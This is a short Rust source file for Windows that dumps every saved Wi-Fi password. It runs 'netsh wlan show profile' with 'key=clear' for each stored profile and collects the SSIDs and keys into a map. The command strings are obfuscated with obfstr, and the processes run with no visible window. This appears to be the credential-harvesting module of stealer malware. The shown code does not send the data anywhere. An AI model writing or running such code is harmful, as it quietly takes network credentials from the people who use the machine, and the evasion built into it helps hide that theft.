use std::{collections::HashMap, process::Command};
use std::{os::windows::process::CommandExt, time::Duration};
use tokio::time::delay_for;
use winapi::um::winbase::CREATE_NO_WINDOW;

pub type WifiLogins = HashMap<String, String>;

async fn get_wifi_profile(ssid: &str) -> Option<String> {
    delay_for(Duration::from_millis(10)).await;

    let output = Command::new(obfstr::obfstr!("netsh.exe"))
        .args(&[
            obfstr::obfstr!("wlan"),
            obfstr::obfstr!("show"),
            obfstr::obfstr!("profile"),
            ssid,
            obfstr::obfstr!("key=clear"),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .ok()?;

    Some(String::from_utf8_lossy(&output.stdout).to_string())
}

pub async fn dump_wifi_passwords() -> Option<WifiLogins> {
    let output = Command::new(obfstr::obfstr!("netsh.exe"))
        .args(&[
            obfstr::obfstr!("wlan"),
            obfstr::obfstr!("show"),
            obfstr::obfstr!("profile"),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .ok()?;

    let mut wifi_logins = WifiLogins::new();

    let list_of_process = String::from_utf8_lossy(&output.stdout);
    for line in list_of_process.lines() {
        if line
            .to_lowercase()
            .contains(obfstr::obfstr!("all user profile"))
            && line.contains(":")
        {
            let ssid = line.split(':').nth(1)?.trim();
            let profile = get_wifi_profile(ssid).await?;
            for pline in profile.lines() {
                if pline
                    .to_lowercase()
                    .contains(obfstr::obfstr!("key content"))
                    && pline.contains(":")
                {
                    let key = pline.split(": ").nth(1)?;
                    wifi_logins.insert(ssid.to_string(), key.to_string());
                }
            }
        }
    }

    Some(wifi_logins)
}
